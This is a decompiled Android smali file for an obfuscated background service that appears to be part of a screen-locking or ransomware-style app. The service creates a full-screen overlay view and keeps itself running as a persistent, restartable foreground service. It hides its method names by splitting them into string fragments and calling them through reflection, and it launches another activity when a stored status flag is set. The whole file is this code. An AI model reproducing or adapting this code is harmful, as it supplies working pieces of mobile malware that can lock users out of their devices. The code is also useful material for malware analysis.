.class public Liakmet/powajekkeh/jrpqhtz/EtroDetra;
.super Landroid/app/Service;
.source "EtroDetra.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# static fields
.field public static instance:Liakmet/powajekkeh/jrpqhtz/EtroDetra;

.field public static overlayView:Liakmet/powajekkeh/jrpqhtz/BigView;


# instance fields
.field protected cancelNotification:Z

.field fdgdfhgd:Ljava/lang/String;

.field protected foreground:Z

.field protected id:I


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 33
    iput-boolean v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->foreground:Z

    .line 34
    iput-boolean v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->cancelNotification:Z

    .line 35
    iput v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->id:I

    .line 37
    const-string v0, "tTimeM"

    iput-object v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->fdgdfhgd:Ljava/lang/String;

    .line 31
    return-void
.end method

.method private notificationIntent()Landroid/app/PendingIntent;
    .locals 4

    .prologue
    .line 113
    new-instance v0, Landroid/content/Intent;

    const-class v2, Liakmet/powajekkeh/jrpqhtz/WaaRtoo;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 115
    .local v0, "intent":Landroid/content/Intent;
    const/4 v2, 0x0

    const/high16 v3, 0x8000000

    invoke-static {p0, v2, v0, v3}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 117
    .local v1, "pending":Landroid/app/PendingIntent;
    return-object v1
.end method

.method public static stop()V
    .locals 1

    .prologue
    .line 87
    sget-object v0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->instance:Liakmet/powajekkeh/jrpqhtz/EtroDetra;

    if-eqz v0, :cond_0

    .line 88
    sget-object v0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->instance:Liakmet/powajekkeh/jrpqhtz/EtroDetra;

    invoke-virtual {v0}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->stopSelf()V

    .line 90
    :cond_0
    return-void
.end method


# virtual methods
.method protected foregroundNotification(I)Landroid/app/Notification;
    .locals 7
    .param p1, "notificationId"    # I

    .prologue
    .line 94
    const-string v3, "B"

    .line 95
    .local v3, "sdfsfdsdsfdas":Ljava/lang/String;
    const-wide/16 v0, 0x0

    .line 97
    .local v0, "fdfd":J
    :try_start_0
    const-string v4, "java.lang.System"

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "curren"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->fdgdfhgd:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "illis"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    new-array v6, v6, [Ljava/lang/Class;

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    new-array v6, v6, [Ljava/lang/Object;

    invoke-virtual {v4, v5, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/Long;

    invoke-virtual {v4}, Ljava/lang/Long;->longValue()J
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v0

    .line 102
    :goto_0
    new-instance v2, Landroid/app/Notification;

    const v4, 0x7f020021

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "F"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "I"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v2, v4, v5, v0, v1}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 104
    .local v2, "notification":Landroid/app/Notification;
    iget v4, v2, Landroid/app/Notification;->flags:I

    or-int/lit8 v4, v4, 0x2

    or-int/lit8 v4, v4, 0x8

    iput v4, v2, Landroid/app/Notification;->flags:I

    .line 106
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "F"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "I "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "F"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "I"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {p0}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->notificationIntent()Landroid/app/PendingIntent;

    move-result-object v6

    invoke-virtual {v2, p0, v4, v5, v6}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 108
    return-object v2

    .line 99
    .end local v2    # "notification":Landroid/app/Notification;
    :catch_0
    move-exception v4

    goto :goto_0
.end method

.method public moveToBackground(I)V
    .locals 1
    .param p1, "id"    # I

    .prologue
    .line 146
    iget-boolean v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->cancelNotification:Z

    invoke-virtual {p0, p1, v0}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->moveToBackground(IZ)V

    .line 147
    return-void
.end method

.method public moveToBackground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 140
    const/4 v0, 0x0

    iput-boolean v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->foreground:Z

    .line 141
    const/4 p1, 0x0

    .line 142
    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    .line 143
    return-void
.end method

.method public moveToForeground(ILandroid/app/Notification;Z)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "notification"    # Landroid/app/Notification;
    .param p3, "cancelNotification"    # Z

    .prologue
    .line 126
    iget-boolean v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->foreground:Z

    if-nez v0, :cond_1

    if-eqz p2, :cond_1

    .line 127
    const/4 v0, 0x1

    iput-boolean v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->foreground:Z

    .line 128
    iput p1, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->id:I

    .line 129
    iput-boolean p3, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->cancelNotification:Z

    .line 131
    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 136
    :cond_0
    :goto_0
    return-void

    .line 132
    :cond_1
    iget v0, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->id:I

    if-eq v0, p1, :cond_0

    if-lez p1, :cond_0

    if-eqz p2, :cond_0

    .line 133
    iput p1, p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->id:I

    .line 134
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, p1, p2}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_0
.end method

.method public moveToForeground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 122
    invoke-virtual {p0, p1}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->foregroundNotification(I)Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, p1, v0, p2}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->moveToForeground(ILandroid/app/Notification;Z)V

    .line 123
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 156
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 15

    .prologue
    .line 42
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 44
    sput-object p0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->instance:Liakmet/powajekkeh/jrpqhtz/EtroDetra;

    .line 45
    new-instance v11, Liakmet/powajekkeh/jrpqhtz/BigView;

    invoke-direct {v11, p0}, Liakmet/powajekkeh/jrpqhtz/BigView;-><init>(Liakmet/powajekkeh/jrpqhtz/EtroDetra;)V

    sput-object v11, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->overlayView:Liakmet/powajekkeh/jrpqhtz/BigView;

    .line 47
    const-string v0, "ste"

    .line 48
    .local v0, "dfd":Ljava/lang/String;
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "sy"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "ma"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    const/4 v12, 0x0

    invoke-virtual {p0, v11, v12}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    .line 49
    .local v10, "userDetails":Landroid/content/SharedPreferences;
    new-instance v8, Liakmet/powajekkeh/jrpqhtz/Pirat;

    invoke-direct {v8, v10}, Liakmet/powajekkeh/jrpqhtz/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 50
    .local v8, "rtrtr":Liakmet/powajekkeh/jrpqhtz/Pirat;
    invoke-virtual {v8}, Liakmet/powajekkeh/jrpqhtz/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 51
    .local v3, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v6, Liakmet/powajekkeh/jrpqhtz/PiratusKa;

    invoke-direct {v6}, Liakmet/powajekkeh/jrpqhtz/PiratusKa;-><init>()V

    .line 52
    .local v6, "putt":Liakmet/powajekkeh/jrpqhtz/PiratusKa;
    const-string v1, "ar"

    .line 53
    .local v1, "dfddfds":Ljava/lang/String;
    const-string v11, "putString"

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "st"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "t"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "st"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "t"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v6, v3, v11, v12, v13}, Liakmet/powajekkeh/jrpqhtz/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 57
    const-string v2, "ppl"

    .line 59
    .local v2, "dfdsfsd":Ljava/lang/String;
    :try_start_0
    const-string v11, "android.content.SharedPreferences$Editor"

    invoke-static {v11}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "a"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "y"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    invoke-virtual {v11, v12, v13}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v11

    const/4 v12, 0x0

    invoke-virtual {v11, v3, v12}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 64
    :goto_0
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "sy"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "ma"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    const/4 v12, 0x0

    invoke-virtual {p0, v11, v12}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 66
    .local v4, "polzovatelDannie":Landroid/content/SharedPreferences;
    new-instance v7, Liakmet/powajekkeh/jrpqhtz/PiratusKin;

    invoke-direct {v7}, Liakmet/powajekkeh/jrpqhtz/PiratusKin;-><init>()V

    .line 67
    .local v7, "putt2":Liakmet/powajekkeh/jrpqhtz/PiratusKin;
    const-string v11, "getString"

    const-string v12, "status"

    const-string v13, "s0"

    invoke-virtual {v7, v4, v11, v12, v13}, Liakmet/powajekkeh/jrpqhtz/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 69
    .local v9, "status":Ljava/lang/String;
    const-string v11, "s9"

    invoke-virtual {v9, v11}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v11

    if-eqz v11, :cond_0

    .line 70
    new-instance v5, Landroid/content/Intent;

    const-class v11, Liakmet/powajekkeh/jrpqhtz/WaaRtoo;

    invoke-direct {v5, p0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 71
    .local v5, "pushIntent":Landroid/content/Intent;
    const/high16 v11, 0x10000000

    invoke-virtual {v5, v11}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 72
    invoke-virtual {p0, v5}, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->startActivity(Landroid/content/Intent;)V

    .line 74
    .end local v5    # "pushIntent":Landroid/content/Intent;
    :cond_0
    return-void

    .line 61
    .end local v4    # "polzovatelDannie":Landroid/content/SharedPreferences;
    .end local v7    # "putt2":Liakmet/powajekkeh/jrpqhtz/PiratusKin;
    .end local v9    # "status":Ljava/lang/String;
    :catch_0
    move-exception v11

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 78
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 80
    sget-object v0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->overlayView:Liakmet/powajekkeh/jrpqhtz/BigView;

    if-eqz v0, :cond_0

    .line 81
    sget-object v0, Liakmet/powajekkeh/jrpqhtz/EtroDetra;->overlayView:Liakmet/powajekkeh/jrpqhtz/BigView;

    invoke-virtual {v0}, Liakmet/powajekkeh/jrpqhtz/BigView;->destory()V

    .line 84
    :cond_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 151
    const/4 v0, 0x1

    return v0
.end method
